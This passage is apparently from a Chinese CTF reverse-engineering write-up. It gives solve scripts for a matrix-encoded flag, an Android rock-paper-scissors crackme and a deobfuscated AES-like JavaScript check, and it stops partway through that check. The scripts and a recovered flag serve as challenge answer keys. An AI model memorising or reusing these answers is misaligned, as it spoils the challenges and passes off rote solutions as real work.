m_A = matrix_multiply(m_C, m_B, 5, 17, 17)
for i in range(5):
    for j in range(17):
        print(chr(round(m_A[i*17+j])), end="")
    print()

B_str = """
18 00 00 00 23 00 00 00  27 00 00 00 2E 00 00 00
0F 00 00 00 2A 00 00 00  15 00 00 00 20 00 00 00
1A 00 00 00 09 00 00 00  29 00 00 00 01 00 00 00
28 00 00 00 03 00 00 00  14 00 00 00 27 00 00 00
30 00 00 00 1C 00 00 00  30 00 00 00 04 00 00 00
1E 00 00 00 17 00 00 00  10 00 00 00 0F 00 00 00
27 00 00 00 14 00 00 00  22 00 00 00 0A 00 00 00
0C 00 00 00 1E 00 00 00  2D 00 00 00 08 00 00 00
0A 00 00 00 18 00 00 00  26 00 00 00 16 00 00 00
28 00 00 00 2D 00 00 00  1B 00 00 00 01 00 00 00
14 00 00 00 0F 00 00 00  05 00 00 00 00 00 00 00
09 00 00 00 06 00 00 00  2C 00 00 00 0B 00 00 00
29 00 00 00 31 00 00 00  14 00 00 00 06 00 00 00
28 00 00 00 08 00 00 00  0A 00 00 00 0D 00 00 00
18 00 00 00 15 00 00 00  27 00 00 00 0E 00 00 00
22 00 00 00 2D 00 00 00  0F 00 00 00 18 00 00 00
29 00 00 00 06 00 00 00  1D 00 00 00 10 00 00 00
25 00 00 00 16 00 00 00  1E 00 00 00 10 00 00 00
05 00 00 00 08 00 00 00  18 00 00 00 25 00 00 00
18 00 00 00 2D 00 00 00  09 00 00 00 1A 00 00 00
23 00 00 00 2F 00 00 00  1E 00 00 00 1B 00 00 00
27 00 00 00 09 00 00 00  13 00 00 00 16 00 00 00
0E 00 00 00 0C 00 00 00  05 00 00 00 17 00 00 00
2B 00 00 00 22 00 00 00  1C 00 00 00 20 00 00 00
14 00 00 00 03 00 00 00  05 00 00 00 18 00 00 00
08 00 00 00 1A 00 00 00  10 00 00 00 1F 00 00 00
03 00 00 00 04 00 00 00  29 00 00 00 29 00 00 00
1A 00 00 00 1D 00 00 00  21 00 00 00 02 00 00 00
07 00 00 00 1E 00 00 00  24 00 00 00 14 00 00 00
24 00 00 00 14 00 00 00  2F 00 00 00 1F 00 00 00
30 00 00 00 25 00 00 00  27 00 00 00 25 00 00 00
23 00 00 00 18 00 00 00  05 00 00 00 12 00 00 00
1B 00 00 00 2A 00 00 00  0C 00 00 00 0B 00 00 00
06 00 00 00 2B 00 00 00  04 00 00 00 0B 00 00 00
27 00 00 00 05 00 00 00  1F 00 00 00 19 00 00 00
11 00 00 00 26 00 00 00  18 00 00 00 06 00 00 00
10 00 00 00 2C 00 00 00  18 00 00 00 04 00 00 00
19 00 00 00 19 00 00 00  1E 00 00 00 1D 00 00 00
06 00 00 00 09 00 00 00  29 00 00 00 11 00 00 00
08 00 00 00 22 00 00 00  21 00 00 00 17 00 00 00
1F 00 00 00 17 00 00 00  2A 00 00 00 1F 00 00 00
0A 00 00 00 31 00 00 00  28 00 00 00 15 00 00 00
11 00 00 00 05 00 00 00  1F 00 00 00 2F 00 00 00
2B 00 00 00 22 00 00 00  2E 00 00 00 22 00 00 00
20 00 00 00 23 00 00 00  2C 00 00 00 2B 00 00 00
15 00 00 00 0D 00 00 00  00 00 00 00 01 00 00 00
20 00 00 00 23 00 00 00  29 00 00 00 10 00 00 00
1E 00 00 00 21 00 00 00  1C 00 00 00 22 00 00 00
0A 00 00 00 1F 00 00 00  1B 00 00 00 28 00 00 00
29 00 00 00 04 00 00 00  0B 00 00 00 2E 00 00 00
15 00 00 00 25 00 00 00  0D 00 00 00 04 00 00 00
1D 00 00 00 30 00 00 00  26 00 00 00 11 00 00 00
30 00 00 00 05 00 00 00  0F 00 00 00 1C 00 00 00
2F 00 00 00 18 00 00 00  1D 00 00 00 0E 00 00 00
08 00 00 00 31 00 00 00  31 00 00 00 28 00 00 00
27 00 00 00 0F 00 00 00  2D 00 00 00 2B 00 00 00
0B 00 00 00 1E 00 00 00  1D 00 00 00 22 00 00 00
14 00 00 00 0C 00 00 00  25 00 00 00 1A 00 00 00
2F 00 00 00 1C 00 00 00  2A 00 00 00 09 00 00 00
13 00 00 00 23 00 00 00  27 00 00 00 2C 00 00 00
1B 00 00 00 19 00 00 00  26 00 00 00 07 00 00 00
12 00 00 00 13 00 00 00  1C 00 00 00 0C 00 00 00
11 00 00 00 08 00 00 00  2B 00 00 00 1C 00 00 00
1E 00 00 00 22 00 00 00  22 00 00 00 06 00 00 00
1A 00 00 00 1B 00 00 00  12 00 00 00 14 00 00 00
1F 00 00 00 21 00 00 00  18 00 00 00 03 00 00 00
13 00 00 00 06 00 00 00  28 00 00 00 1E 00 00 00
30 00 00 00 12 00 00 00  1D 00 00 00 04 00 00 00
13 00 00 00 1D 00 00 00  01 00 00 00 0B 00 00 00
1A 00 00 00 1F 00 00 00  15 00 00 00 1C 00 00 00
25 00 00 00 10 00 00 00  2D 00 00 00 05 00 00 00
19 00 00 00 1C 00 00 00  0E 00 00 00 15 00 00 00
26 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
"""

C_str = """
5F 38 00 00 30 54 00 00  13 40 00 00 54 37 00 00
24 45 00 00 41 38 00 00  97 3B 00 00 F5 41 00 00
18 3F 00 00 D3 41 00 00  ED 37 00 00 5D 27 00 00
30 45 00 00 DE 41 00 00  B3 40 00 00 A4 3D 00 00
A9 3E 00 00 70 38 00 00  21 52 00 00 37 3E 00 00
67 35 00 00 37 43 00 00  0C 3A 00 00 87 3A 00 00
4C 40 00 00 1B 3C 00 00  F5 41 00 00 EB 39 00 00
B3 26 00 00 0C 47 00 00  B9 44 00 00 81 3F 00 00
82 3D 00 00 67 3C 00 00  0B 37 00 00 EC 53 00 00
69 3F 00 00 57 34 00 00  9C 44 00 00 0E 38 00 00
33 39 00 00 92 3E 00 00  4E 3C 00 00 1A 3F 00 00
A8 38 00 00 17 29 00 00  23 41 00 00 45 41 00 00
19 41 00 00 63 3A 00 00  64 3F 00 00 81 38 00 00
C9 54 00 00 25 3F 00 00  54 37 00 00 78 46 00 00
C7 3A 00 00 86 3B 00 00  5C 41 00 00 6C 40 00 00
B1 41 00 00 A7 39 00 00  F7 26 00 00 76 43 00 00
8C 3E 00 00 C2 42 00 00  0D 3B 00 00 FD 3F 00 00
1C 37 00 00 43 52 00 00  02 40 00 00 99 36 00 00
6A 43 00 00 32 36 00 00  32 3A 00 00 19 40 00 00
A3 3C 00 00 C3 40 00 00  F0 34 00 00 08 27 00 00
87 43 00 00 02 40 00 00  C5 3F 00 00 3F 3C 00 00
23 3C 00 00 00 00 00 00  00 00 00 00 00 00 00 00
"""
m_B = []
for idx, hex in enumerate(B_str.split()):
    if idx % 4 == 0:
        m_B.append(int(hex, 16))
m_B = m_B[:-3]
m_B = invert_matrix(m_B)

m_C = []
for idx in range(85):
    num = str_to_little_endian_hex("".join(C_str.split()[idx*4:idx*4+4]))
    m_C.append(num)


m_A = matrix_multiply(m_C, m_B, 5, 17, 17)
for i in range(5):
    for j in range(17):
        print(chr(round(m_A[i*17+j])), end="")
    print()
#mOUNDwh??WCr46s
# 1Et_us_dr4w_a_p1cTuRE_WlTh_mAtRIx_And1mOUND_wh1tE_Cr46s

"""
  11          111
  1111  11    11
  1111  11  11
1111111111  11
  11111111  11
    1111    11
      11  111111
        111111111
          1111111
            11111
          11  111
        11    111
      11    11
      11  11    1
          11  11
"""
```

## 安安又卓卓

拖进jadx。

第一层是石头剪刀布，对面的出拳是写死的。第二层去逆向那个数字就行。第三层混淆了但没完全混淆。

```python
right_choice = ['2', '3', '2', '2', '2', '2', '2', '3', '2', '1', '1', '2', '1', '1', '1', '2', '2', '3', '1', '2', '2', '3', '2', '2', '2', '3', '1', '3', '2', '2', '1', '2', '2', '1', '3', '2', '1', '1', '3', '3', '2', '3', '3', '2', '3', '2', '2', '3', '2', '3', '1', '2', '2', '3', '2', '2', '2', '3', '2', '3', '3', '3', '1', '3', '2', '1', '3', '2', '1', '2', '2', '3', '2', '3', '3', '3', '2', '2', '3', '3', '2', '3', '2', '1', '1', '3', '1', '1', '2', '3', '3', '3', '2', '3', '3', '2', '2', '3', '3', '2', '2', '3', '2', '3', '2', '1', '3', '3', '2', '2', '1', '2', '2', '1', '1', '1', '1', '2', '2', '1', '2', '1', '2', '1', '3', '3', '1', '3', '2', '3', '1', '2', '1', '2', '2', '1', '2', '1', '3', '2', '3', '1', '1', '2', '2', '3', '1', '3', '2', '1', '2', '2', '2', '1', '3', '2', '2', '1', '2', '3', '2', '3', '1', '3', '2', '2', '1', '2', '2', '3', '1', '2', '2', '1', '2', '1', '2', '3', '3', '3', '2', '2', '3', '1', '2', '1', '1', '1', '2', '1', '2', '2', '2', '3', '1', '2', '1', '2', '2', '1', '2', '1', '3', '2', '3', '3', '3', '2', '2', '3', '1', '2', '2', '3', '1', '3', '2', '1', '2', '1', '3', '1', '3', '3', '2', '1', '3', '2', '2', '2', '2', '1', '2', '1', '3', '2', '1', '1', '1', '2', '2', '1', '3', '2', '2', '1', '2', '2', '2', '1', '2', '3', '1', '3', '3', '3']
left_choice = ""
for i in right_choice:
    # 1 石头 2 剪刀 3 布
    if i == '1':
        left_choice += '3'
    elif i == '2':
        left_choice += '1'
    elif i == '3':
        left_choice += '2'
print(left_choice)
```

```python
def add(a, b): return a + b
def sub(a, b): return a - b
def mul(a, b): return a * b
def xor(a, b): return a ^ b

def check3(i):
    return mul(sub(add(sub(mul(xor(add(mul(xor(mul(add(sub(mul(xor(mul(mul(i, 13), 7), 2), 11), 5), 4), 13), 14), 12), 10), 10), 6), 2), 8), 3), 3) == 39285729;


def check4(i):
    return add(mul(sub(sub(add(sub(mul(xor(add(sub(mul(sub(sub(xor(sub(add(i, 6), 15), 2), 12), 13), 13), 13), 6), 12), 7), 4), 5), 8), 8), 7), 8) == -8770;


def check5(i):
    return xor(mul(xor(mul(mul(add(add(sub(add(xor(xor(sub(xor(mul(mul(mul(i, 11), 2), 8), 12), 5), 3), 1), 6), 13), 7), 7), 15), 11), 2), 15), 4) == 19196134;


def check6(i):
    return sub(sub(sub(xor(xor(xor(xor(sub(sub(xor(mul(add(xor(add(mul(sub(i, 10), 3), 4), 7), 1), 13), 8), 15), 9), 8), 8), 1), 1), 1), 5), 11) == 2811;


def check7(i):
    return xor(sub(xor(add(xor(mul(xor(xor(sub(mul(xor(sub(add(xor(mul(add(i, 9), 4), 15), 7), 14), 1), 10), 7), 14), 6), 9), 2), 2), 1), 9), 14) == 88647;


def check8(i):
    return xor(xor(mul(add(add(mul(add(mul(add(add(mul(mul(mul(sub(sub(xor(i, 4), 13), 10), 1), 13), 12), 12), 13), 14), 9), 10), 2), 10), 3), 1), 3) == 22156564;


def check9(i):
    return mul(mul(xor(xor(sub(add(sub(sub(mul(mul(xor(add(mul(xor(add(xor(i, 12), 7), 14), 15), 8), 14), 7), 12), 1), 15), 9), 2), 5), 4), 3), 5) == 13313010;


def check10(i):
    return sub(mul(xor(sub(add(xor(xor(xor(add(mul(add(mul(xor(add(mul(sub(i, 5), 2), 3), 8), 11), 8), 14), 14), 6), 10), 13), 1), 9), 12), 3), 4) == 1117943;


def check11(i):
    return xor(xor(mul(xor(add(xor(add(mul(sub(mul(xor(sub(add(mul(add(add(i, 11), 10), 3), 1), 9), 2), 11), 7), 1), 11), 6), 7), 1), 7), 3), 4) == 876250;


def check12(i):
    return add(sub(sub(add(add(add(sub(mul(add(xor(xor(xor(xor(sub(add(sub(i, 5), 1), 2), 5), 11), 14), 13), 12), 15), 2), 5), 1), 6), 11), 8), 10) == 90631;


def check13(i):
    return mul(xor(add(xor(mul(mul(add(add(xor(sub(add(xor(xor(mul(add(sub(i, 12), 2), 4), 5), 14), 1), 2), 5), 12), 8), 15), 1), 2), 10), 6), 14) == 11794482;


def check14(i):
    return xor(mul(sub(xor(add(add(sub(add(xor(add(mul(xor(xor(xor(add(xor(i, 5), 10), 1), 5), 3), 14), 14), 5), 9), 9), 11), 13), 4), 2), 7), 14) == 2801093;


def check15(i):
    return xor(add(xor(sub(mul(add(sub(add(sub(sub(xor(mul(mul(xor(add(xor(i, 13), 4), 3), 9), 8), 4), 9), 3), 2), 14), 1), 14), 7), 4), 9), 4) == 51699040;

for i in range(0, 10000000):
    if check4(i):
        print(i, end=",")
        break
for i in range(0, 10000000):
    if check5(i):
        print(i, end=",")
        break
for i in range(0, 10000000):
    if check6(i):
        print(i, end=",")
        break
for i in range(0, 10000000):
    if check7(i):
        print(i, end=",")
        break
for i in range(0, 10000000):
    if check8(i):
        print(i, end=",")
        break
for i in range(0, 10000000):
    if check9(i):
        print(i, end=",")
        break
for i in range(0, 10000000):
    if check10(i):
        print(i, end=",")
        break
for i in range(0, 10000000):
    if check11(i):
        print(i, end=",")
        break
for i in range(0, 10000000):
    if check12(i):
        print(i, end=",")
        break
for i in range(0, 10000000):
    if check13(i):
        print(i, end=",")
        break
for i in range(0, 10000000):
    if check14(i):
        print(i, end=",")
        break
for i in range(0, 10000000):
    if check15(i):
        print(i, end=",")
        break
```

```python
def add(a, b): return a + b
def sub(a, b): return a - b
def mul(a, b): return a * b
def xor(a, b): return a ^ b
def flag0(i):
    i2 = mul(xor(i, 2), 12)
    return mul(sub(sub(xor(add(add(i2, 1), 1), 2), 10), 3), 5) == 4435

def flag1(i):
    i2 = add(i, 10)
    return sub(add(mul(xor(add(sub(sub(i2, 1), 12), 11), 5), 10), 3), 15) == 968

def flag2(i):
    i2 = sub(add(add(xor(i, 9), 3), 10), 10)
    return sub(mul(xor(mul(i2, 1), 2), 3), 5) == 313

def flag3(i):
    i2 = mul(sub(mul(sub(i, 3), 2), 2), 15)
    return add(xor(xor(mul(i2, 1), 6), 9), 4) == 3037

def flag4(i):
    return add(xor(mul(xor(sub(mul(mul(sub(i, 7), 12), 5), 11), 13), 12), 8), 6) == 71918

def flag5(i):
    return sub(xor(xor(xor(sub(xor(xor(mul(i, 7), 11), 12), 7), 3), 11), 10), 12) == 691

def flag6(i):
    return xor(add(xor(sub(xor(mul(mul(mul(i, 1), 8), 6), 4), 13), 7), 9), 6) == 4559

def flag7(i):
    return add(mul(sub(xor(xor(sub(mul(xor(i, 6), 3), 5), 13), 3), 14), 8), 11) == 1675

def flag8(i):
    return mul(sub(add(xor(xor(sub(add(add(i, 12), 12), 7), 3), 13), 14), 5), 12) == 1464

def flag9(i):
    return xor(xor(xor(mul(xor(xor(xor(mul(i, 2), 6), 13), 14), 10), 8), 9), 11) == 2056

def flag10(i):
    return add(xor(xor(mul(xor(mul(sub(sub(i, 2), 13), 2), 13), 11), 8), 10), 14) == 2249

def flag11(i):
    return add(add(mul(mul(sub(sub(sub(sub(i, 4), 15), 14), 10), 7), 5), 13), 6) == 2399

def flag12(i):
    i2 = sub(xor(mul(xor(i, 10), 15), 13), 15)
    return mul(xor(sub(add(i2, 1), 12), 5), 11) == 15873

def flag13(i):
    return sub(xor(add(mul(sub(xor(mul(add(i, 10), 14), 15), 12), 8), 9), 7), 2) == 12292

def flag14(i):
    return xor(mul(add(xor(xor(sub(mul(mul(i, 13), 15), 5), 6), 10), 14), 10), 9) == 185309

def flag15(i):
    i2 = mul(xor(xor(xor(add(mul(mul(i, 8), 7), 6), 5), 11), 13), 14)
    return xor(i2, 1) == 64359

def flag16(i):
    return xor(mul(mul(xor(mul(add(add(sub(i, 9), 6), 8), 11), 2), 5), 13), 8) == 75652

def flag17(i):
    i2 = sub(add(sub(sub(mul(i, 14), 11), 7), 4), 3)
    return sub(sub(mul(i2, 1), 14), 4) == 1617

def flag18(i):
    return add(add(mul(sub(sub(add(mul(xor(i, 3), 5), 13), 4), 4), 6), 13), 4) == 3107

def flag19(i):
    return mul(sub(xor(sub(mul(mul(mul(sub(i, 5), 2), 10), 8), 5), 7), 4), 7) == 122024

def flag20(i):
    return mul(add(sub(add(mul(sub(xor(add(i, 8), 5), 15), 7), 15), 7), 15), 15) == 12000

def flag21(i):
    return mul(sub(add(xor(xor(xor(xor(sub(i, 1), 14), 8), 8), 5), 3), 6), 1) == 108

def flag22(i):
    i2 = sub(i, 6)
    return mul(sub(sub(xor(xor(sub(mul(i2, 1), 8), 7), 9), 7), 6), 15) == 240

def flag23(i):
    return xor(mul(mul(mul(sub(add(add(sub(i, 2), 12), 7), 6), 6), 14), 9), 10) == 33274

for i in range(0, 10000000):
    if flag0(i):
        print(chr(i), end="")
        break
for i in range(0, 10000000):
    if flag1(i):
        print(chr(i), end="")
        break
for i in range(0, 10000000):
    if flag2(i):
        print(chr(i), end="")
        break
for i in range(0, 10000000):
    if flag3(i):
        print(chr(i), end="")
        break
for i in range(0, 10000000):
    if flag4(i):
        print(chr(i), end="")
        break
for i in range(0, 10000000):
    if flag5(i):
        print(chr(i), end="")
        break
for i in range(0, 10000000):
    if flag6(i):
        print(chr(i), end="")
        break
for i in range(0, 10000000):
    if flag7(i):
        print(chr(i), end="")
        break
for i in range(0, 10000000):
    if flag8(i):
        print(chr(i), end="")
        break
for i in range(0, 10000000):
    if flag9(i):
        print(chr(i), end="")
        break
for i in range(0, 10000000):
    if flag10(i):
        print(chr(i), end="")
        break
for i in range(0, 10000000):
    if flag11(i):
        print(chr(i), end="")
        break
for i in range(0, 10000000):
    if flag12(i):
        print(chr(i), end="")
        break
for i in range(0, 10000000):
    if flag13(i):
        print(chr(i), end="")
        break
for i in range(0, 10000000):
    if flag14(i):
        print(chr(i), end="")
        break
for i in range(0, 10000000):
    if flag15(i):
        print(chr(i), end="")
        break
for i in range(0, 10000000):
    if flag16(i):
        print(chr(i), end="")
        break
for i in range(0, 10000000):
    if flag17(i):
        print(chr(i), end="")
        break
for i in range(0, 10000000):
    if flag18(i):
        print(chr(i), end="")
        break
for i in range(0, 10000000):
    if flag19(i):
        print(chr(i), end="")
        break
for i in range(0, 10000000):
    if flag20(i):
        print(chr(i), end="")
        break
for i in range(0, 10000000):
    if flag21(i):
        print(chr(i), end="")
        break
for i in range(0, 10000000):
    if flag22(i):
        print(chr(i), end="")
        break
for i in range(0, 10000000):
    if flag23(i):
        print(chr(i), end="")
        break

```

## DouDou

使用工具反混淆得到

```js
const M = [[99, 124, 119, 123, 242, 107, 111, 197, 48, 1, 103, 43, 254, 215, 171, 118], [202, 130, 201, 125, 250, 89, 71, 240, 173, 212, 162, 175, 156, 164, 114, 192], [183, 253, 147, 38, 54, 63, 247, 204, 52, 165, 229, 241, 113, 216, 49, 21], [4, 199, 35, 195, 24, 150, 5, 154, 7, 18, 128, 226, 235, 39, 178, 117], [9, 131, 44, 26, 27, 110, 90, 160, 82, 59, 214, 179, 41, 227, 47, 132], [83, 209, 0, 237, 32, 252, 177, 91, 106, 203, 190, 57, 74, 76, 88, 207], [208, 239, 170, 251, 67, 77, 51, 133, 69, 249, 2, 127, 80, 60, 159, 168], [81, 163, 64, 143, 146, 157, 56, 245, 188, 182, 218, 33, 16, 255, 243, 210], [205, 12, 19, 236, 95, 151, 68, 23, 196, 167, 126, 61, 100, 93, 25, 115], [96, 129, 79, 220, 34, 42, 144, 136, 70, 238, 184, 20, 222, 94, 11, 219], [224, 50, 58, 10, 73, 6, 36, 92, 194, 211, 172, 98, 145, 149, 228, 121], [231, 200, 55, 109, 141, 213, 78, 169, 108, 86, 244, 234, 101, 122, 174, 8], [186, 120, 37, 46, 28, 166, 180, 198, 232, 221, 116, 31, 75, 189, 139, 138], [112, 62, 181, 102, 72, 3, 246, 14, 97, 53, 87, 185, 134, 193, 29, 158], [225, 248, 152, 17, 105, 217, 142, 148, 155, 30, 135, 233, 206, 85, 40, 223], [140, 161, 137, 13, 191, 230, 66, 104, 65, 153, 45, 15, 176, 84, 187, 22]],
    r = '4b000aec37eca4a5adb8a52427dcb15d',
    A = 'f046ebac49868e2749c41174664c7170',
    s = 'ffec2c8fb93ce3877c8a0141ca32e286',
    y = '7a1a45825df566087e57b3eb84a11f1a',
    B = '73f748de4f0c51fccfde4b8c36fca0df',
    F = 'dd6e52061e848546cfd52b695da8505e',
    w = '9bf135a63a480f6fd6e69ab1932adbd2',
    Q = 'bd1788cd459dedcc2860d71760776dbd',
    b = 'e46889fa856a463907d82a8137b7b2a8',
    p = 'ac4f324af944e5cd48118a44977f9e09',
    i = '0519d37966d5f0d782820f2e29002aab',
    f = 'd2dceedae2b841966e6611ab0f2a73d2';
function O(q, V) {
    // 进行循环，循环次数为16次，处理两个数组的前16个元素
    for (var x = 0; x < 16; x++) {
        // 对数组 q 和 V 的第 x 个元素进行异或运算 (^)
        // 异或运算是一种二进制操作，当两个比特不相同时结果为1，相同时为0
        // 结果与255进行按位与操作 (&)
        // 255的二进制表示为11111111，按位与操作确保结果是一个8位的数值
        q[x] = (q[x] ^ V[x]) & 255;
    }
}

function o(q) {
    // 传入的q是长度30的字符串
    // 初始化数组V，包含16个零。
    var V = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
        x, P;

    // 遍历数组q的前15个元素。
    for (var g = 0; g < 16; g++) {
        // 从q[g] 
        x = (q[g] & 240) >> 4; // x是q[g]的高4位
        // 从q[g]的低4位计算P。
        P = q[g] & 15; // P是q[g]的低4位
        // 根据矩阵M和计算出的x和P的值，更新V[g]的值。
        // 注意：这里假设存在一个名为M的二维数组。
        V[g] = M[x][P];
    }

    // 返回更新后的数组V。
    return V;
}



function j(q) {
    // [0, 1, 2, 3, 
//     4, 5, 6, 7, 
//     8, 9, 10, 11, 
//     12, 13, 14, 15]
//    变成：
//    [
//       0, 5, 10, 15, 
//        4, 9,14, 3,  
//        8, 13, 2, 7,
//      12, 1,  6, 11
//    ]
// 也就是第x列, 向上移动x个位置

    // q是一个长度为16的数组（整数）
    var V = 0;  // 声明一个变量V，用于暂存数据
    for (var x = 0; x < 4; x++) {  // 外层循环，x从0到3
        for (var P = 0; P < x; P++) {  // 中层循环，P从0到x-1
            V = q[x];  // 把q数组中x位置的值暂存到V中
            for (var g = 0; g < 4; g++) {  // 内层循环，g从0到3
                // 将q中当前位置的元素替换为下一行同列位置的元素
                q[x + 4 * g] = q[x + 4 * (g + 1)];
            }
            q[x + 12] = V;  // 把最初暂存的值V赋给数组q中的指定位置
        }
    }
}

function W(q) {
    var V = q << 1;
    return ((q >> 7) & 1) && ((V = V ^ 27), V); // 如果q的最高位是1，则将V与27进行异或运算, 否则返回V
}
function L(q) { // 如果q的最高位是1，则将返回q^27^q, 否则返回q^q.
    return W(q) ^ q;
}
function I(q) {
    var V, // 用于循环的变量
        x = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]; // 初始化输出数组

    
    // x 第0列
    for (V = 0; V < 4; V++) {
        // 为x的当前索引（4*V）赋值
        // 使用W和L函数变换q数组的元素，并进行异或运算(^)
        x[4 * V] = W(q[4 * V]) ^ L(q[4 * V + 1]) ^ q[4 * V + 2] ^ q[4 * V + 3];
    }

    // x 第1列
    for (V = 0; V < 4; V++) {
        // 类似上面的操作，这次计算的是4*V+1位置的元素
        x[4 * V + 1] = q[4 * V] ^ W(q[4 * V + 1]) ^ L(q[4 * V + 2]) ^ q[4 * V + 3];
    }

    // x 第2列
    for (V = 0; V < 4; V++) {
        // 计算4*V+2位置的元素
        x[4 * V + 2] = q[4 * V] ^ q[4 * V + 1] ^ W(q[4 * V + 2]) ^ L(q[4 * V + 3]);
    }

    // x 第3列
    for (V = 0; V < 4; V++) {
        // 计算4*V+3位置的元素
        x[4 * V + 3] = L(q[4 * V]) ^ q[4 * V + 1] ^ q[4 * V + 2] ^ W(q[4 * V + 3]);
    }

    return x; // 返回处理后的数组
}

function l(q, V) { // 合并。q = [0x12, 0x34, 0x56, 0x78] 则V = 0x12345678
    return (q[V] & 255) << 24 | (q[V + 1] & 255) << 16 | (q[V + 2] & 255) << 8 | q[V + 3] & 255;
}
function K(q, V) { // q = 0x12345678 则V = [0x12, 0x34, 0x56, 0x78]
    for (var x = 0; x < 4; V[x++] = q >> 8 * (3 - x) & 255) { }
}
function v(q, V) {
    // 初始化两个长度为4的数组x和P，都填充为0。
    var x = [0, 0, 0, 0],
        P = [0, 0, 0, 0],
        
        // g数组是一系列的数值，可能用于生成某种密钥扩展中的常数。
        g = [16777216, 33554432, 67108864, 134217728, 268435456, 536870912, 1073741824, 2147483648, 452984832, 905969664];
    
    // 循环从4开始，到小于8结束，即迭代4次。
    for (var d = 4; d < 8; d++) {
        // 当d是4的倍数时执行以下代码
        if (d!=4) {
            // 对q数组中的最后一个元素进行位运算，然后调用函数K，这里假设K是某种处理函数
            K(q[d - 1] >> 24 | q[d - 1] << 8, x);// x存储q[d-1]旋转左移8位的结果. [0xaa, 0xbb, 0xcc, 0xdd]

            // 调用函数o，这里假设o是某种处理函数，处理x和P数组，输出结果到P
            o(x, P, 4); // 只传入x。

            // 使用异或运算符来更新q数组的当前元素
            q[d] = q[d - 4] ^ l(P, 0) ^ g[V];
        } else {
            // 否则，只使用简单的异或运算来更新q数组的当前元素
            q[d] = q[d - 4] ^ q[d - 1];
        }
    }
}

function e(q) {
    // q传进来一个字符串如'504850485048504850485048504850'
    var tt = {
        q: '0x86',
        V: '0x88',
        x: '0x7d',
        P: '0x496',
        g: '0x4a5'
    },
        t9 = {
            q: '0x600'
        },
        t8 = {
            q: '0x145'
        },
        t7 = {
            q: '0x1d4'
        };
    var V = 0,
        x = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
        P = [87, 52, 116, 101, 114, 68, 114, 48, 112, 67, 84, 70, 50, 48, 50, 52, 82, 23, 108, 70, 32, 83, 30, 118, 80, 16, 74, 48, 98, 32, 120, 4, 231, 171, 158, 236, 199, 248, 128, 154, 151, 232, 202, 170, 245, 200, 178, 174, 11, 156, 122, 10, 204, 100, 250, 144, 91, 140, 48, 58, 174, 68, 130, 148, 24, 143, 88, 238, 212, 235, 162, 126, 143, 103, 146, 68, 33, 35, 16, 208, 46, 69, 40, 19, 250, 174, 138, 109, 117, 201, 24, 41, 84, 234, 8, 249, 137, 117, 177, 51, 115, 219, 59, 94, 6, 18, 35, 119, 82, 248, 43, 142, 136, 132, 168, 51, 251, 95, 147, 109, 253, 77, 176, 26, 175, 181, 155, 148, 221, 144, 138, 74, 38, 207, 25, 39, 219, 130, 169, 61, 116, 55, 50, 169, 92, 179, 89, 216, 122, 124, 64, 255, 161, 254, 233, 194, 213, 201, 219, 107, 183, 10, 38, 219, 205, 118, 102, 36, 108, 136, 143, 230, 185, 65, 84, 141];
    // 调用函数 O，传入 q 和 P，此函数未在代码中定义，可能执行某种初始化或处理
    O(q, P); // q ^= P[:16]. q是字符串，长度30，这里对前15个字符进行异或操作

    // 执行一个循环，循环体内对 q 进行一系列操作
    for (var g = 1; g < 10; g++) {
        V = o(q),     // 调用函数 o，传入 q，此函数未定义
        j(V),         // 调用函数 j，传入 V，此函数未定义
        V = I(V),     // 调用函数 I，传入 V，进行某种操作，此函数未定义
        O(V, P['slice'](16 * g, 16 * (g + 1))), // 再次调用 O，传入 V 和 P 的一部分
        q = V;        // 将 V 赋值给 q，用于下一次循环
    }

    // 在循环外再进行一系列操作
    V = o(q),
    j(V),
    v(x + 40, 10), // 调用函数 v，传入 x+40 和 10. 似乎没用
    O(V, P.slice(160)); // 调用 O，传入 V 和 P 的另一部分

    // 对 V 数组中的每个元素进行异或操作
    for (var g = 0; g < V['length']; g++) {
        V[g] ^= 153;
    }

    // 返回处理后的 V
    return V;
}
function check(q) {
    var tA = {
        q: '0x292',
        V: '0x29e',
        x: '0x20f',
        P: '0x21d',
        g: '0x5c',
        d: '0x67',
        ts: '0x29d',
        ty: '0x2a9',
        tB: '0x212',
        tF: '0x21c',
        tw: '0x61',
        tQ: '0x6e',
        tb: '0x89',
        tp: '0x7e',
        ti: '0x2a5',
        tf: '0x2a1',
        tO: '0x5f',
        to: '0x68',
        tj: '0x1fb',
        tW: '0x1f2',
        tL: '0x76',
        tI: '0x77',
        tl: '0x210',
        tK: '0x221',
        tv: '0x2a0',
        te: '0x29a'
    },
        tr = {
            q: '0x25e'
        },
        tM = {
            q: '0x489'
        },
        tm = {
            q: '0xbd'
        };
    var V = JSON['parse'](JSON['stringify'](q)),
        x = [];
    for (var P = 0; P < 12; P++) {
        x.push(
            e(q[P]) // 1. 首先，通过索引 P 从 q 中获取一个元素，并将该元素作为参数传递给函数 e。
                .map(g => // 2. 对函数 e 返回的结果执行 map 方法，该方法将对每个元素执行以下的函数。
                    g.toString(16) // 3. 将每个元素 g 转换为十六进制字符串。
                        .padStart(2, '0') // 4. 如果转换后的字符串不足两位，前面补零。
                )
                .join('') // 5. 将所有处理后的元素合并成一个单一的字符串。
        );
    }
    x = x['join'](''); // 拼接x里所有字符串为一个字符串
    if (x == '4b000aec37eca4a5adb8a52427dcb15df046ebac49868e2749c41174664c7170ffec2c8fb93ce3877c8a0141ca32e2867a1a45825df566087e57b3eb84a11f1a73f748de4f0c51fccfde4b8c36fca0dfdd6e52061e848546cfd52b695da8505e9bf135a63a480f6fd6e69ab1932adbd2bd1788cd459dedcc2860d71760776dbde46889fa856a463907d82a8137b7b2a8ac4f324af944e5cd48118a44977f9e090519d37966d5f0d782820f2e29002aabd2dceedae2b841966e6611ab0f2a73d2') {
        // 初始化两个字符串变量：flag 用于最终结果，res 用于中间结果。
        var flag = '', res = '';

        // 循环遍历 V 数组的每个元素（假设 V 是已定义的二维数组），索引为 P。V 像['504850485048504850485048504850', '']
        for (var P = 0; P < 12; P++) {
            // 将 V[P]（一个数组）中的每个元素 g 通过 String.fromCharCode 转换成字符，
            // map 函数会返回一个新的数组，其中包含了转换后的字符。
            res += V[P]['map'](g => String['fromCharCode'](g));
